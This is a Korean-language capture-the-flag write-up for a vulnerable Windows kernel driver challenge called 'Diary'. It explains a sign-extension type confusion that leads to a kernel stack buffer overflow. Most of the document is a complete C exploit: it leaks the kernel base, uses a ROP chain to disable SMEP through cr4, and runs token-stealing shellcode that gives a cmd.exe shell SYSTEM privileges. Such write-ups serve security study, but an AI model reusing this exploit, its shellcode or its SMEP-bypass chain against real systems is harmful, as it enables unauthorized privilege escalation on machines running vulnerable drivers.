# Diary

---

환경 : windows10 19041.630

1. 출제의도/배경
    
    - 사용자는 드라이버의 DeviceIoControl을 통해 kernel에게 IRP 패킷을 보낼 수 있습니다.  만약 드라이버에 취약한 코드가 존재한다면 공격자는 악의적인 행위를 통해 DoS, LPE 등을 수행할 수 있습니다.
2. 취약점에 대한 설명
    
    - systembuffer로부터 첫번째 바이트를 읽고, 이 값으로 길이 값을 검사하게 되는데 이 때 type confusion이 발생하게 되어 허용된 메모리보다 크게 값이 복사되어 kernel stack buffer overflow 취약점이 발생하게 됩니다.
3. 접근 및 풀이

    ioctl code 0x222008을 처리하는 루틴을 보게 되면 한 함수가 있습니다. 이 함수는 사용자로부터 받은 문자열을 Anna's_diary라는 파일에 생성 및 입력합니다. 입력하기 전 사용자한테 받은 systembuffer의 첫번째 바이트를 읽습니다. 그리고 이 값이 0x10보다 크면 함수를 빠져나오고 아니면 이 값 크기만큼 스택에 복사하게 됩니다.

    ```c
    v4 = *(a2 + 24);
    if ( *v4 > 16 )
       return 0;
    sub_140001780(&Buffer, v4, *v4);
    ```

    어셈블리어 코드상으로 보면 다음과 같습니다.

    ```c
    movsx   eax, byte ptr [rsp+68h]
    cmp     eax, 10h
    ```

    movsx는 부호비트로 목적지 피연산자의 왼쪽비트들을 채우기 때문에 첫번째 바이트가 7f보다 크게되면 eax값이 ffffff??가 되게 됩니다. ffffff?? 값을 음수로 판단하기 때문에 해당 분기문을 통과할 수 있게 됩니다.

    ```c
    mov     rax, qword ptr [rsp+0E8h+var_80]
    and     rax, 0FFh
    mov     [rsp+68h], rax
    mov     r8, [rsp+68h]
    mov     rdx, [rsp+78h]
    lea     rcx, [rsp+0C0h]
    call    sub_140001780
    ```

    분기문을 통과한 후 분기문에서 사용되었던 rax(00000000`ffffff??) 값을 0xff와 and 연산을 하고, 복사할 크기 값으로 사용합니다.

    `char Buffer; // [rsp+C0h] [rbp-28h]`

    `struct _IO_STATUS_BLOCK IoStatusBlock; // [rsp+D0h] [rbp-18h]`

     ****buffer가 스택에 할당된 크기는 0x10 만큼이지만 0x7f 이상인 값만큼 복사가 되기 때문에 kernel stack buffer overflow가 발생하게 됩니다. ret을 조작할 수 있기 때문에 cr4로 SMEP을 우회하고 토큰을 steal링하면 됩니다.

4. 익스플로잇 코드

```c
#include <stdio.h>
#include <string.h>
#include <Windows.h>

#define DEVICE_NAME		L"\\\\.\\diary"
#define IOCTL_CODE		0x222008

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG NumberOfModules;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(NTAPI* PNtQuerySystemInformation) (
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

char shellcode[] = "\x48\x31\xc0"
"\x65\x48\x8b\x04\x25\x88\x01"
"\x00\x00"
"\x48\x8b\x80\xb8\x00\x00\x00"
"\x48\x89\xc1"
"\x4c\x8b\x99\xb8\x04\x00\x00"
"\x49\x83\xe3\x07"
"\xba\x04\x00\x00\x00"
"\x48\x8b\x80\x48\x04\x00\x00"
"\x48\x2d\x48\x04\x00\x00"
"\x48\x39\x90\x40\x04\x00\x00"
"\x75\xea"
"\x48\x8b\x90\xb8\x04\x00\x00"
"\x48\x83\xe2\xf0"
"\x4c\x09\xda"
"\x48\x89\x91\xb8\x04\x00\x00"

"\x65\x48\x8b\x04\x25\x88\x01"
"\x00\x00"

"\x48\x83\xc4\x50"
"\xc3";

UINT64 GetKernelBase() {
	PNtQuerySystemInformation NtQuerySystemInformation;
	PSYSTEM_MODULE_INFORMATION pModuleInfo;
	PVOID kernelBase;
	ULONG len = 0;
	NTSTATUS status;

	NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(
		GetModuleHandleA("ntdll.dll"),
		"NtQuerySystemInformation"
	);
	if (!NtQuerySystemInformation) {
		printf("[!] GetProcAddress failed with error %lu.\n", GetLastError());
		ExitProcess(0);
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);
	if (status != (NTSTATUS)0) {
		printf("[!] NtQuerySystemInformation failed.\n");
		ExitProcess(0);
	}
	kernelBase = pModuleInfo->Module[0].ImageBase;
	return (UINT64)kernelBase;
}

int main() {
	HANDLE hDevice;
	UINT64 kernelBase;
	LPVOID shellcode_addr;

	char payload[0xf0] = { 0, };

	UINT64 mov_cr4_rcx, pop_rcx;
	UINT64 cr4_value = 0x70678;
	UINT64 zero = 0x0;

	PROCESS_INFORMATION pi;
	STARTUPINFOA si;

	hDevice = CreateFileW(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW failed with error %lu.\n", GetLastError());
		ExitProcess(0);
	}

	shellcode_addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	memcpy(shellcode_addr, shellcode, sizeof(shellcode));
	printf("[+] shellcode_addr: 0x%llx\n", shellcode_addr);

	kernelBase = GetKernelBase();
	printf("[+] kernelBase: 0x%llx\n", kernelBase);
	mov_cr4_rcx = kernelBase + 0x39cf77;
	pop_rcx = kernelBase + 0x3f1530;

	memset(payload, 0x80, sizeof(payload));
	memcpy(payload + 0x28, &pop_rcx, 8);
	memcpy(payload + 0x30, &cr4_value, 8);
	memcpy(payload + 0x38, &mov_cr4_rcx, 8);
	memcpy(payload + 0x40, &shellcode_addr, 8);

	if (!DeviceIoControl(hDevice, IOCTL_CODE, payload, sizeof(payload), NULL, 0, NULL, NULL)) {
		printf("[!] DeviceIoControl failed with error %lu.\n", GetLastError());
		ExitProcess(0);
	}

	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));

	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
		printf("[!] CreateFileA failed with error %lu.\n", GetLastError());
		ExitProcess(0);
	}
	
	return 0;
}
```

![Diary/Untitled.png](Diary/Untitled.png)